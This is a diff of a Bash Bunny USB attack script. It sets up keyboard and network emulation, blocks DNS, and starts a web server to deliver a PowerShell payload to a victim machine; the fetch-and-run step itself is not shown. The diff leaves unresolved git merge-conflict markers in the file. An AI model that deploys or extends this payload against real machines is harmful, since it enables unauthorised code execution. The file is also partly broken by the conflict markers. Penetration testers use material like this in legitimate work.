@@ -10,11 +10,15 @@
 #
 # Quick HID attack to retrieve and run powershell payload from BashBunny web server
 # ensure p.txt (your powershell payload) exists in payload directory
+<<<<<<< HEAD
 # 
+=======
+#
+>>>>>>> f8a442e66dc60ae47c6a4584ccdfcd5b901a386d
 # | Attack Stage        | Description                              |
 # | ------------------- | ---------------------------------------- |
 # | Stage 1             | Running Initial Powershell Commands      |
-# | Stage 3             | Delivering powershell payload            |
+# | Stage 2             | Delivering powershell payload            |
 #
 
 ATTACKMODE RNDIS_ETHERNET HID
@@ -27,10 +31,17 @@ GET SWITCH_POSITION
 # DEFINE DIRECTORIES
 PAYLOAD_DIR=/root/udisk/payloads/${SWITCH_POSITION}
 SERVER_LOG=/tmp/server.log
+<<<<<<< HEAD
 
 # SERVER LOG
 rm -f ${SERVER_LOG}
 
+=======
+
+# SERVER LOG
+rm -f ${SERVER_LOG}
+
+>>>>>>> f8a442e66dc60ae47c6a4584ccdfcd5b901a386d
 # START HTTP SERVER
 iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
 /tools/gohttp/gohttp -p 80 -d /tmp/ > ${SERVER_LOG} 2>&1 &
